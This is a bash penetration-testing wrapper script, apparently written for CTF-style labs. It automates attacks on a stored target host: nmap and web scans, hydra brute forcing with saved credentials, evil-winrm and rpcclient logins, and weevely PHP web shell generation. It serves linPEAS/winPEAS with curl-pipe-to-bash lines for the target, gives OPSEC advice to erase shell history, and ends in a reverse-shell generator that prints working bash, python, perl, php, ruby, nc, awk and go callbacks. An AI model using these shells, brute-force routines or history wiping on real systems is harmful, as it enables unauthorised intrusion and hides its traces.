#!/bin/bash
# Remeber to use: https://www.shellcheck.net
set -euo pipefail
IFS=$'\n\t'

# Uncomment for Debugging
#set -x

# Show 2DOs - internal command
if [ "$#" -eq 1 ] && [ "$1" == "2do" ]; then
  grep -Ein "^##|^# 2DO|^# -" "$0" | sed 's,\\t.*,,'
  exit
fi

prompt() {
  read -p "[?] Run command? (y/N): " -n 1 -r
  echo
  if [[ ! "$REPLY" =~ ^[Yy]$ ]]; then
    exit
  fi
}

show_help() {
  echo -e "\n[ FOXACID || Commando Script ][ Doomguy: https://github.com/doomguy ]\n"
  echo "Available commands:"
  grep "^##" "$0" | sort | column -t -s'^' | sed 's,##,  fxy ,'
  echo
}

checkCmd() {
  if [ ! "$(which "$CMD")" ]; then
    echo "[!] '$CMD' required but missing."
    exit
  fi
}

getIP() {
  if ip a | grep -q "tun0"; then
    DEV="tun0"
  else
    DEV="eth0"
  fi

  IP=$(ip -4 addr show "$DEV" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
  if [ -z "$IP" ]; then
    echo "[!] Error getting IP. Stale tun0 device?"; exit
  fi
  echo "$IP"
}

getExtIP() {
  EIP=$(curl ifconfig.me)
  # curl api.ipify.org
  # curl ipinfo.io/ip
  # curl wtfismyip.com/text
  # curl checkip.amazonaws.com
  echo "$EIP"
}

showCreds() {
  FILE="creds.txt"
  echo "Available creds:"
  echo "     0  (Use for NULL sessions)"
  if [ -e "$FILE" ]; then
    column -t -s':' "$FILE" | cat -n
  else
    echo -e "\n[*] No '$FILE' found!"
  fi
  exit
}

getCreds() {
  if [ "$CID" -eq 0 ]; then
    USRNME="NULL"
    PASSWD="NULL"
  else
    FILE="creds.txt"
    if [ ! -e "$FILE" ]; then
      echo "[!] No '$FILE' found!"; exit
    fi
    if [ "$CID" -gt "$(wc -l $FILE | cut -d' ' -f1)" ]; then
      echo "[!] Invalid credential ID!"; exit
    fi

    USRNME=$(sed -n "${CID}p" "$FILE" | cut -d':' -f1)
    PASSWD=$(sed -n "${CID}p" "$FILE" | cut -d':' -f2)
    HASH=$(sed -n "${CID}p" "$FILE" | cut -d':' -f3)

  fi
}

createUserPassLists() {
  FILE="creds.txt"
  if [ ! -e "$FILE" ]; then
    echo "[!] No '$FILE' found!"; exit
  fi
  FPATH="/dev/shm/.fxy"
  if [ ! -d "$FPATH" ]; then
    mkdir "$FPATH"
  fi
  # userlist
  if [ "$(which "userlstgen.py")" ]; then
    genuserlst.py "$FILE" | tr '[:upper:]' '[:lower:]' | sort -u > "$FPATH/user.lst"
  else
    echo "[*] Did not find 'genuserlst.py' in PATH. Falling back to simple mode."
    cut -d: -f1 "$FILE" | tr '[:upper:]' '[:lower:]' | sort -u | grep -v ^$ > "$FPATH/user.lst"
  fi
  # passlist
  cut -d: -f2 "$FILE" | sort -u | grep -v ^$ > "$FPATH/pass.lst"
}

getMachinePass() {
  PASSWD="$(echo -n "$(hostname)$(cat /sys/class/net/*/address | head -n1)" | sha256sum | cut -c1-20)"
}

## h(elp)^: Show this help
if [ ! "$#" -ge 1 ] || [ "$1" == "h" ] || [ "$1" == "help" ]|| [ "$1" == "-h" ] || [ "$1" == "-?" ]; then
  show_help
  exit
fi

## r(host) [target]^: Show/Set RHOST
# Set RHOST
if [ "$#" -eq 2 ] && { [ "$1" == "r" ] || [ "$1" == "rhost" ]; }; then
  FPATH="/dev/shm/.fxy"
  FILE="/dev/shm/.fxy/rhost"
  if [ "$#" -eq 2 ]; then
    if [ ! -d "$FPATH" ]; then
      mkdir "$FPATH"
    fi
    echo "$2" > $FILE
  else
    echo "[!] You need to supply an IP or hostname as second argument!"
  fi
  exit
fi

# Load RHOST from cache
FILE="/dev/shm/.fxy/rhost"
if [ -f $FILE ]; then
  RHOST="$(cat $FILE)"
  export RHOST

  if [ -z "$RHOST" ]; then
     echo "Something went wrong on loading '$FILE'"
     RHOST="127.0.0.1"
     export RHOST
  fi
else
  # There is no place like 127.0.0.1
  RHOST="127.0.0.1"
  export RHOST
fi

# Show RHOST
if [ "$#" -eq 1 ] && { [ "$1" == "r" ] || [ "$1" == "rhost" ]; }; then
  echo "  RHOST: $RHOST"
  exit
fi

## creds [add user:pass]|[del cid]^: Show/Add/Del creds
if [ "$1" == "creds" ]; then
  FILE="creds.txt"
  if [ "$#" -eq 1 ]; then
    showCreds; exit
  elif [ "$2" == "add" ] && [ "$#" -eq 3 ]; then
    # add entry
    ENTRY="$3"
    if [[ ! "$ENTRY" =~ .*:$ ]]; then
      ENTRY="$ENTRY:"
    fi
    CMD="echo '$ENTRY' >> $FILE"
  elif [ "$2" == "del" ] && [ "$#" -eq 3 ]; then
    # del entry
    CID="$3"
    if [ ! -e "$FILE" ]; then
      echo "[!] No '$FILE' found!"; exit
    fi
    if [ "$CID" -gt "$(wc -l $FILE | cut -d' ' -f1)" ] || [ "$CID" -eq 0 ]; then
      echo "[!] Invalid credential ID!"; exit
    fi
    CMD="sed -i '${CID}d' $FILE"
  elif [ "$2" == "edit" ]; then
    nano "$FILE"
    exit
  fi
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## pass(word)^: Show default machine password
if [ "$#" -eq 1 ] && { [ "$1" == "pass" ] || [ "$1" == "password" ]; }; then
  getMachinePass
  echo -e "\n  The following password is used as default value in various locations and is unique to this machine."
  echo -e "\n  Default machine password: $PASSWD\n"
  exit
fi

## httpd|ws [port]^: python3 -m http.server PORT
if [ "$1" == "httpd" ] || [ "$1" == "ws" ] ; then
  CMD="python3 -m http.server"
  PORT="80"
  if [ "$#" -eq 2 ]; then
    PORT="$2"
  fi
  CMD="$CMD $PORT"
  echo "URL: http://$(getIP)/"
  echo "DIR: $(pwd)"
  for f in $(find . -maxdepth 1 -type f 2>/dev/null | sed 's,\./,,' | sed 's, ,+,'); do
    echo "- http://$(getIP)/$f";
  done
  echo "> $CMD"
  bash -c "$CMD"
  exit
fi

## l(isten) [port]^: ncat -vlkp PORT
if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
  CMD="ncat"; checkCmd
  if [ "$#" -eq 2 ]; then
    PORT="$2"
  else
    PORT="9001"
  fi
  CMD="$CMD -vlkp $PORT"
  # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
  echo "[*] Shell upgrade instructions:"
  echo "    python -c 'import pty;pty.spawn(\"/bin/bash\")'"
  echo "    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
  echo "    Ctrl-z"
  echo "    stty raw -echo"
  echo "    fg + [Enter x 2]"
  echo -n "    export SHELL=/bin/bash; export TERM=$TERM;"
  ROWS="$(stty -a | grep -oE "rows [0-9]{1,}" | cut -d' ' -f2)"
  COLS="$(stty -a | grep -oE "columns [0-9]{1,}" | cut -d' ' -f2)"
  echo -e " stty rows $ROWS columns $COLS\n"
  # https://attack.mitre.org/techniques/T1070/003/
  echo "[*] OPSEC (Linux):"
  echo "    unset HISTFILE; export HISTFILESIZE=0;"
  echo "    # make sure to check history before deleting!"
  echo -e "    history -c; rm ~/.bash_history\n"
  echo "> $CMD"
  bash -c "$CMD"
  exit
fi

## socat [port]^: socat based listener
# https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
if [ "$1" == "socat" ]; then
  CMD="socat"; checkCmd
  if [ "$#" -eq 2 ]; then
    PORT="$2"
  else
    PORT="9001"
  fi
  CMD="$CMD file:$(tty),raw,echo=0 tcp-listen:$PORT"
  # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
  echo "> Run this on your target:"
  echo -e "   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT\n"
  echo "> $CMD"
  bash -c "$CMD"
  exit
fi

## n(map) [full]^: nmap -v -A (-p-) RHOST | tee
if [ "$1" == "n" ] || [ "$1" == "nmap" ]; then
  CMD="nmap"; checkCmd
  if [ "$#" -eq 2 ] && [ "$2" == "full" ]; then
    CMD="$CMD -p-"
  fi
  CMD="$CMD -v -A $RHOST -oA ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S)"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## nikto [s|ssl|tls] [subdir]^: nikto -host PROTO://RHOST+SUBDIR | tee
if [ "$1" == "nikto" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi

    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
  fi

  CMD="$CMD -host $PROTO://${RHOST}${SUBDIR} | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## cme [smb]^: crackmapexec smb RHOST | tee
if [ "$1" == "cme" ] || [ "$1" == "crackmapexec" ]; then
  CMD="crackmapexec"; checkCmd
  if [ "$#" -eq 2 ] && [ "$2" == "smb" ]; then
    CMD="$CMD smb"
  else
    exit
  fi
  CMD="$CMD $RHOST | tee ${RHOST}_cme_$(date +%F_%H%M%S).log"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## dirb [s|ssl|tls] [subdir]^: dirb PROTO://RHOST+SUBDIR | tee
if [ "$1" == "dirb" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi

    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
  fi

  CMD="$CMD $PROTO://${RHOST}${SUBDIR} | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## curl [s|ssl|tls] [subdir]^: curl -si PROTO://RHOST+SUBDIR | less
if [ "$1" == "curl" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi

    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
  fi

  CMD="$CMD -ski $PROTO://${RHOST}${SUBDIR} | less"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## p(ing) [count]^: ping -c COUNT RHOST
if [ "$1" == "p" ] || [ "$1" == "ping" ]; then
  CMD="ping"; checkCmd

  if [ "$#" -eq 2 ]; then
    CMD="$CMD -c $2"
  fi

  CMD="$CMD $RHOST"
  echo "> $CMD"
  bash -c "$CMD"
  exit
fi

## smbpasswd [cid]^: smbpasswd -r RHOST -U :cid_user
if [ "$1" == "smbpasswd" ]; then
  CMD="$1"; checkCmd

  # No ID supplied
  if [ "$#" -eq 1 ]; then
    showCreds
    exit
  fi

  # CredID supplied
  if [ "$#" -eq 2 ]; then
    CID="$2"
    getCreds
  fi

  CMD="$CMD -r $RHOST -U $USRNME"
  echo "Password: $PASSWD"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## (evil-)winrm [cid]^: evil-winrm -i RHOST -u :cid_user -p :cid_pass
if [ "$1" == "evil-winrm" ] || [ "$1" == "winrm" ]; then
  CMD="evil-winrm"; checkCmd

  # No ID supplied
  if [ "$#" -eq 1 ]; then
    showCreds
    exit
  fi

  # CredID supplied
  if [ "$#" -eq 2 ]; then
    CID="$2"
    getCreds
  fi

  CMD="$CMD -i $RHOST -u '$USRNME' -p '$PASSWD'"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## peas [version] [port]^: Download *peas and serve via http.server
if [ "$1" == "peas" ] && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy peas lin"
  echo "  fxy peas winbat"
  echo "  fxy peas winany"
  echo "  fxy peas win86"
  echo "  fxy peas win64"
  exit
fi

if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "winany" ] || [ "$2" == "winbat" ] || [ "$2" == "win86" ] || [ "$2" == "win64" ]; }; then
  echo "[?] Download *peas and serve via http.server?"; prompt

  FPATH="/dev/shm/.fxy/peas"
  if [ ! -d "$FPATH" ]; then
    mkdir -p "$FPATH"
  fi
  cd "$FPATH"

  case "$2" in
    "lin")       wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh' -O "$FPATH/linpeas.sh" ;;
    "winbat")    wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat' -O "$FPATH/winPEAS.bat" ;;
    "winany")    wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe' -O "$FPATH/winPEASany.exe" ;;
    "win86")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe' -O "$FPATH/winPEASx86.exe" ;;
    "win64")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe' -O "$FPATH/winPEASx64.exe" ;;
    *)           echo "[!] Error parsing PEAS version for download!"; exit ;;
  esac

  PORT="80"
  if [ "$#" -eq 3 ]; then
    PORT="$3"
  fi

  CMD="python3 -m http.server $PORT"
  echo "$(tput bold)[*] Run this on your target:"

  case "$2" in
    "lin")       echo "  curl -s $(getIP)/linpeas.sh|bash|tee linpeas_"'$(whoami).log' ;;
    "winbat")    echo "  Invoke-WebRequest -OutFile winPEAS.bat -Uri http://$(getIP)/winPEAS.bat; .\winPEAS.bat|tee winpeas.log" ;;
    "winany")    echo "  Invoke-WebRequest -OutFile winPEASany.exe -Uri http://$(getIP)/winPEASany.exe;.\winPEASany.exe| tee winpeas.log" ;;
    "win86")     echo "  Invoke-WebRequest -OutFile winPEASx86.exe -Uri http://$(getIP)/winPEASx86.exe;.\winPEASx86.exe| tee winpeas.log" ;;
    "win64")     echo "  Invoke-WebRequest -OutFile winPEASx64.exe -Uri http://$(getIP)/winPEASx64.exe;.\winPEASx64.exe| tee winpeas.log"  ;;
    *)           echo "[!] Error parsing PEAS version for help text!"; exit ;;
  esac

  echo "$(tput sgr0) "
  echo "> $CMD"
  bash -c "$CMD"
  exit
fi
# 2DO:
# - winpeas flagged by AMSI :/
# - Different DL for v2?: (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe'

## wfuzz^: wfuzz | tee
# wfuzz help
if [ "$1" == "wfuzz" ] && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy wfuzz vhost [s|ssl|tls] [domain] [hw] [hc]"
  echo "  fxy wfuzz [s|ssl|tls] [subdir] [hw] [hc]"
  exit
fi

# wfuzz vhost
if [ "$1" == "wfuzz" ] && [ "$2" == "vhost" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  DOMAIN="$RHOST"
  if [ "$#" -ge 3 ]; then
    # https?
    if [ "$3" == "s" ] || [ "$3" == "ssl" ] || [ "$3" == "tls" ]; then
      PROTO="https"
    fi

    if [ "$#" -ge 4 ] && [ "$PROTO" == "https" ]; then
      DOMAIN="$4"
    elif [ "$#" -ge 3 ] && [ "$PROTO" == "http" ]; then
      DOMAIN="$3"
    fi
  fi

  # Setup tmp path and wordlist
  FPATH="/dev/shm/.fxy/wfuzz"
  if [ ! -d "$FPATH" ]; then
    mkdir -p "$FPATH"
  fi
  cd "$FPATH"
  if [ ! -f "subdomains-top1million-20000.txt" ]; then
    wget 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-20000.txt' -O subdomains-top1million-20000.txt
  fi

  HW=""; HC=""
  if [ "$#" -eq 4 ] && [ "$PROTO" == "http" ];  then HW="--hw $4"; fi
  if [ "$#" -eq 5 ] && [ "$PROTO" == "http" ];  then HW="--hw $4"; HC="--hc $5"; fi
  if [ "$#" -eq 5 ] && [ "$PROTO" == "https" ]; then HW="--hw $5"; fi
  if [ "$#" -eq 6 ] && [ "$PROTO" == "https" ]; then HW="--hw $5"; HC="--hc $6"; fi

  CMD="wfuzz -H 'Host: FUZZ.$DOMAIN' -u '$PROTO://$RHOST' -w $FPATH/subdomains-top1million-20000.txt $HW $HC"
  CMD="$CMD | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_vhost_$(date +%F_%H%M%S).log"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  rm -rf "$FPATH"
  exit
fi

# wfuzz normal
if [ "$1" == "wfuzz" ] && [ "$2" != "vhost" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUB="/"
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi

    if [ "$#" -ge 3 ] && [ "$PROTO" == "https" ]; then
      SUB="$3"
    elif [ "$#" -ge 2 ] && [ "$PROTO" == "http" ]; then
      SUB="$2"
    fi
  fi

  HW=""; HC=""
  if [ "$#" -eq 3 ] && [ "$PROTO" == "http" ];  then HW="--hw $3"; fi
  if [ "$#" -eq 4 ] && [ "$PROTO" == "http" ];  then HW="--hw $3"; HC="--hc $4"; fi
  if [ "$#" -eq 4 ] && [ "$PROTO" == "https" ]; then HW="--hw $4"; fi
  if [ "$#" -eq 5 ] && [ "$PROTO" == "https" ]; then HW="--hw $4"; HC="--hc $5"; fi

  CMD="wfuzz -u '$PROTO://${RHOST}${SUB}' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt $HW $HC"
  CMD="$CMD | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  rm -rf "$FPATH"
  exit
fi

## cewl [s|ssl|tls] [subdir]^: cewl PROTO://RHOST+SUBDIR -w RHOST_cewl.txt
if [ "$1" == "cewl" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi
    # subdir?
    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
  fi

  CMD="$CMD $PROTO://${RHOST}${SUBDIR} -w ${RHOST}_cewl.txt"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## ssh [cid] [port]^: sshpass -e ssh :cid_user@RHOST -p PORT
if [ "$1" == "ssh" ]; then
  if [ ! "$(which sshpass)" ]; then
    echo "[!] 'sshpass' required but missing."
    CMD="sudo apt install sshpass"
    echo "> $CMD"
    prompt
    bash -c "$CMD"
  fi

  # No ID supplied
  if [ "$#" -eq 1 ]; then
    showCreds
    exit
  fi

  # CredID supplied
  if [ "$#" -ge 2 ]; then
    CID="$2"
    getCreds
  fi

  export SSHPASS=$PASSWD
  CMD="sshpass -v -e ssh -o StrictHostKeyChecking=no $USRNME@$RHOST"

  # port?
  if [ "$#" -eq 3 ]; then
    PORT="$3"
    CMD="$CMD -p $PORT"
  fi

  echo "> $CMD"
  bash -c "$CMD"
  exit
fi

## nfs|showmount^: showmount -e RHOST
if [ "$1" == "nfs" ] || [ "$1" == "showmount" ]; then
  CMD="showmount"; checkCmd
  CMD="showmount -e $RHOST"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## (i)conv|convert [file]^: iconv -f UTF-16LE -t UTF-8 FILE -o FILE.conv
if { [ "$1" == "iconv" ] || [ "$1" == "conv" ] || [ "$1" == "convert" ]; } && [ "$#" -eq 2 ]; then
  CMD="iconv"; checkCmd

  FILE="$2"
  if [ ! -f "$FILE" ]; then
    echo "[!] Invalid input file!"; exit
  fi

  CMD="iconv -f UTF-16LE -t UTF-8 $FILE -o $FILE.conv"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## b64(e|d) [input]^: Encode/Decode base64
if [[ "$1" =~ b64(e|d)? ]] && [ "$#" -eq 2 ]; then
  CMD="base64"; checkCmd
  case "$1" in
    "b64"|"b64e")  echo -n "$2" | base64; echo; exit ;;
    "b64d")       echo -n "$2" | base64 -d; echo; exit ;;
    *)             echo "[!] Error parsing type of operation!"; exit ;;
  esac
fi

## (cyber)chef^: Open CyberChef in your browser
if [ "$1" == "chef" ] || [ "$1" == "cyberchef" ]; then
  CMD="firefox"; checkCmd
  CMD="firefox https://gchq.github.io/CyberChef/"

  if [ "$#" -eq 3 ] && [ "$2" == "magic" ]; then
    INPUT=$(echo -n "$3" | base64 | sed 's,=,,g')
    echo "Run this in your browser (I can't do it for you!):"
    echo "  https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=$INPUT"
    exit
  fi

  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## weevely [gen|help]^: weevely php shell
# weevely help
if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "help" ]; then
  echo "Available commands:"
  echo "  fxy weevely gen [file] [password]"
  echo "  fxy weevely [s|ssl|tls] [subdir] [file] [password]"
  exit
fi

# weevely generate
if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "gen" ]; then
  CMD="$1"; checkCmd
  FILE="fxy.php"
  getMachinePass
  # filename?
  if [ "$#" -eq 3 ]; then
    FILE="$3"
  fi
  # pasword?
  if [ "$#" -eq 4 ]; then
    PASSWD="$4"
  fi
  CMD="$CMD generate $PASSWD $FILE"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

# weevely connect mode
if [ "$1" == "weevely" ]; then
  CMD="$1"; checkCmd
  FILE="fxy.php"
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi
    # subdir?
    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
    # filename?
    if [ "$#" -eq 4 ] && [ "$PROTO" == "https" ]; then
      FILE="$4"
    elif [ "$#" -eq 3 ] && [ "$PROTO" == "http" ]; then
      FILE="$3"
    fi
    # password?
    if [ "$#" -eq 5 ] && [ "$PROTO" == "https" ]; then
      PASSWD="$5"
    elif [ "$#" -eq 4 ] && [ "$PROTO" == "http" ]; then
      PASSWD="$4"
    fi
  fi
  getMachinePass
  CMD="$CMD $PROTO://${RHOST}${SUBDIR}${FILE} $PASSWD"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## rpc(client) [cid] [domain] [cmd]^: rpcclient
#rpcclient -A auth.txt -W domain.local 10.10.10.193 -c "enumdomusers" > out.txt
if [ "$1" == "rpc" ] || [ "$1" == "rpcclient" ]; then
  CMD="rpcclient"; checkCmd

  # No ID supplied
  if [ "$#" -eq 1 ]; then
    showCreds
    exit
  fi

  # CredID supplied
  if [ "$#" -ge 2 ]; then
    # NULL session?
    if [ "$2" -eq 0 ]; then
      CMD="$CMD -U '' -N"
    else
      CID="$2"
      getCreds
      CMD="$CMD -U '$USRNME%$PASSWD'"
    fi
  fi

  # workgroup?
  WRKGRP=""
  if [ "$#" -ge 3 ]; then
    WRKGRP="-W $3"
  fi

  # command?
  CMND=""
  if [ "$#" -ge 4 ]; then
    CMND="-c $4 | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$4_$(date +%F_%H%M%S).log"
  fi

  CMD="$CMD $WRKGRP $RHOST $CMND"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## hydra [service] [port] [username]^: hydra brute force (ssh, ftp, smb)
# hydra help
if [ "$1" == "hydra" ] && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy hydra ssh [port] [username]"
  echo "  fxy hydra ftp [port] [username]"
  echo "  fxy hydra smb [port] [username]"
  echo "  fxy hydra http [url] [username] [subdir]"
  echo -e "\n[i] For more check out: https://book.hacktricks.xyz/brute-force"
  exit
fi

# hydra -I -L user.lst -P pass.lst -u -e sr -s 22333 127.0.0.1 ssh
# hydra -I -L user.lst -P pass.lst -u -e sr -s 21 127.0.0.1 ftp
# hydra -I -L user.lst -P pass.lst -u -e sr -s 445 127.0.0.1 smb
# hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
if { [ "$1" == "hydra" ] || [ "$1" == "brute" ]; } && [ "$#" -ge 2 ]; then
  CMD="hydra"; checkCmd
  createUserPassLists
  FPATH="/dev/shm/.fxy"
  SUBDIR="" # used for http

  SVC="$2"
  case "$SVC" in
    "ssh")              PORT="-s 22"; SVC="ssh" ;;
    "ftp")              PORT="-s 21"; SVC="ftp" ;;
    "smb")              PORT="-s 445"; SVC="smb" ;;
    "http"|"http-get")  PORT="-s 80"; SVC="http-get"; SUBDIR="/" ;;
    *)                  echo "[!] Error parsing service to attack!"; exit ;;
  esac

  if [ "$#" -ge 3 ]; then
    PORT="-s $3"
  fi

  if [ "$#" -ge 4 ]; then
    USRNME="-l $4"
  else
    USRNME="-L $FPATH/user.lst"
  fi

  if [ "$#" -ge 5 ]; then
    SUBDIR="$5"
  fi

  CMD="hydra -I $USRNME -P $FPATH/pass.lst -u -e sr $PORT $RHOST $SVC $SUBDIR"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## rev(shell) [type] [port]^: Reverse shell generator (bash, php, python, perl, ...)
# revshell help
if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy revshell [type] [port]"
  echo -e "\nAvailable revshells:"
  SHELLS="bash php pyton2|py2 python|python3|py|py3 perl ruby nc|ncat|netcat awk go ps|psh|pwsh|powershell lua telnet socat"
  IFS=" "
  for i in $SHELLS; do
    echo "[+] $i"
  done | sort
  echo -e "\n[i] Checkout for more: https://book.hacktricks.xyz/shells/shells/linux\n"
  exit
fi

# revshell help
if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -ge 2 ]; then
  PORT="9001"
  if [ "$#" -ge 3 ]; then
    PORT="$3"
  fi

  echo -e "> Run this on your target:\n"
  TYPE="$2"
  case "$TYPE" in
    "bash")                         echo "bash -i >& /dev/tcp/$(getIP)/$PORT 0>&1" ;;
    "php")                          echo "php -r '\$s=fsockopen(\"$(getIP)\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
    "python2"|"py2")                echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$(getIP)\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;;
    "python"|"python3"|"py"|"py3")  echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$(getIP)\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;;
    "perl")                         echo "perl -e 'use Socket;\$i="\"$(getIP)\"";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
    "ruby")                         echo "ruby -rsocket -e'f=TCPSocket.open(\"$(getIP)\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ;;
    "nc"|"ncat"|"netcat")           echo "nc -e /bin/sh $(getIP) $PORT" ;;
    "awk")                          echo -e "[*] WARNING: This shell is NOT upgradeable!\n"; echo "awk 'BEGIN {s=\"/inet/tcp/0/$(getIP)/$PORT\";while(42){do{printf \"shell> \"|& s;s|& getline c; if(c){while((c|& getline)>0) print \$0|& s;close(c);}} while(c!=\"exit\") close(s);}}' /dev/null" ;;
    "go"|"golang")                  echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$(getIP):$PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" ;;
